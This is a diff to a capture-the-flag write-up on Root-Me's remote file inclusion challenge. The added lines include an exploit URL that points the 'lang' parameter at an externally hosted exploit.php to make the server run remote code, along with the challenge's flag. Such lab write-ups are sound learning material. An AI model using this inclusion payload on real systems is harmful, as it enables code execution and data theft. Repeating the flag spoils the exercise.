@@ -1,4 +1,4 @@
-
+#RFI #Github-Pages #github-pages #webhost-github #webhost
 ##### Challenge Description 
 
 Get the PHP source code.
@@ -78,11 +78,13 @@ Another thing to be considered, we know that the include function has a trailing
 2. We use null byte injection, hence we can control the file we want to include. The request will be like https://h4ckrati.github.io/rfi-test/exploit.php%00 But, unfortunately, this PHP version is already later than PHP 5.3, hence the null byte injection vulnerability has been patched.
 
 
-Then,
+Then, after going into the website, http://challenge01.root-me.org/web-serveur/ch13/?lang=https://h4ckrati.github.io/rfi-test/exploit I got the source code 
 
 ![](../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260310233931.png)
 
-
+Flag : R3m0t3_iS_r3aL1y_3v1l
 ## Closing
 
 Congratulations! you have tried to exploit RFI, and I really hope it encourages you to learn more. I think this is really interesting especially when you finally understand how RFI exploitation works. I wrote a deep explanation of RFI and LFI in this [post](https://joshuanatan.medium.com/remote-file-inclusion-local-file-inclusion-rfi-lfi-c5911c0a1a5a). Using this post, you will understand deeper about RFI and LFI exploitation.
+
+##### Include can be very dangerous
